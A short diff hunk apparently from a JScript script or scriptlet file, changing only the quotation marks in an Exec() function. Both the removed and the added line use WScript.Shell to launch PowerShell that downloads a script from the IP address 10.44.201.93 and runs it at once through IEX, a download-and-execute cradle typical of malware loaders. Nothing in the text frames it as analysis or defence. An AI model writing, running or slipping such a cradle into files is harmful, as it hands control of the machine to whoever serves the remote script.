@@ -20,7 +20,7 @@
 
 	function Exec()
 	{
-		var r = new ActiveXObject("WScript.Shell").Run("powershell.exe /c IEX (iwr 'http://10.44.201.93/pl.psh')");
+		var r = new ActiveXObject("WScript.Shell").Run('powershell.exe /c IEX (iwr "http://10.44.201.93/pl.psh")');
 	}
 
 ]]>
